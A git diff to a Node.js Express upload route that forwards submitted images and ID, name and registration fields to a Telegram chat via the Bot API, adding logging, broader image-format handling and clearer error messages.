@@ -20,46 +20,61 @@ app.get("/", (req, res) => {
 
 app.post("/upload", async (req, res) => {
   try {
+    console.log("DATA RECEIVED:", req.body);
+
     const { image, userId, name, reg, final } = req.body;
 
+    // ✅ FINAL DATA (after submit)
     if (final) {
-  await axios.post(
-    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
-    {
-      chat_id: CHAT_ID,
-      text: `✅ FINAL DATA\nID: ${userId}\nName: ${name}\nReg: ${reg}`
+      await axios.post(
+        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+        {
+          chat_id: CHAT_ID,
+          text: `✅ FINAL DATA\nID: ${userId}\nName: ${name}\nReg: ${reg}`
+        }
+      );
+
+      return res.json({ message: "Final data sent ✅" });
     }
-  );
 
-  return res.json({ message: "Final data sent ✅" });
-}
-
+    // ❌ If no image or userId
     if (!image || !userId) {
       return res.status(400).json({ message: "Missing data ❌" });
     }
 
-    const base64Data = image.replace(/^data:image\/png;base64,/, "");
+    // ✅ FIXED: works for all image formats
+    const base64Data = image.split(";base64,").pop();
     const fileName = `${userId}_${Date.now()}.png`;
 
     fs.writeFileSync(fileName, base64Data, "base64");
 
     const formData = new FormData();
     formData.append("chat_id", CHAT_ID);
-    formData.append("photo", fs.createReadStream(fileName));
+
+    // ✅ FIXED: include filename (important)
+    formData.append("photo", fs.createReadStream(fileName), {
+      filename: fileName
+    });
+
+    // ✅ Caption logic
     let caption = `ID: ${userId}`;
 
     if (name && reg) {
       caption += `\nName: ${name}\nReg: ${reg}`;
     }
-    
+
+    console.log("CAPTION:", caption);
+
     formData.append("caption", caption);
 
+    // ✅ Send to Telegram
     await axios.post(
       `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
       formData,
       { headers: formData.getHeaders() }
     );
 
+    // ✅ Delete temp file
     if (fs.existsSync(fileName)) {
       fs.unlinkSync(fileName);
     }
@@ -67,10 +82,10 @@ app.post("/upload", async (req, res) => {
     res.json({ message: "Sent ✅" });
 
   } catch (err) {
-    console.error(err);
+    console.error("ERROR:", err.response?.data || err.message);
     res.status(500).send("Error");
   }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log("Server running"));
+app.listen(PORT, () => console.log("Server running 🚀"));
